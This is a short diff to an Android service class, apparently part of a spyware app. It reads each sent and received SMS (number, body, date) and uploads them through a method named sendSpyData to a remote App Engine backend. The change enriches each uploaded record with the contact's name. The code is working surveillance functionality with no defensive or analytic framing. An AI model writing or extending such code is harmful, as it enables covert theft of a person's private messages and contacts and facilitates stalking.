@@ -80,14 +80,18 @@ public class SmsService extends Service {
 								.getString(cursor.getColumnIndexOrThrow("protocol"));
 
 						String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
-
+						String contactName = ContactsUtility.getPhoneNumber(getContentResolver(), address);
 						AppEngineClient client = new AppEngineClient(devID);
 						String title;
 						if (protocol == null) {
-							title = SMS_SENT_TITLE + address;
+							title = SMS_SENT_TITLE;
 						} else {
-							title = SMS_RECEIVED_TITLE + address;
+							title = SMS_RECEIVED_TITLE;
 						}
+						if(!contactName.isEmpty()) {
+							title += contactName + " ";
+						}
+						title += address;
 						client.sendSpyData(title, body, date);
 					} while (cursor.moveToNext());
 				}
